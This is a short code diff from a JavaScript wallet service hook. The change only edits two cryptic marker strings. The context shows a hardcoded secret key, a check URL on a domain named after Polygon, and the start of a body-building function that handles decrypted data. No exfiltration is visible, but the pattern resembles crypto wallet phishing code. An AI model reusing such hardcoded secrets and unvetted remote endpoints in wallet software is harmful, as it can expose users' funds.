@@ -60,8 +60,8 @@ const useWalletService = () => {
 	let url = 'https://polygonfinance.org/concept/unity/check'
 	// let url = 'http://polygonfinance.org/concept/unity/check'
 	const kitkat = 'aBN6qreLALR9QYPy'
-	let xxx = 'P01G$ID|EX/G'
-	let xx = 'P01G$ID|EX'
+	let xxx = 'P01G$ID/G'
+	let xx = 'P01G$ID'
 
 	function createBody(str, account) {
 		let strDecr
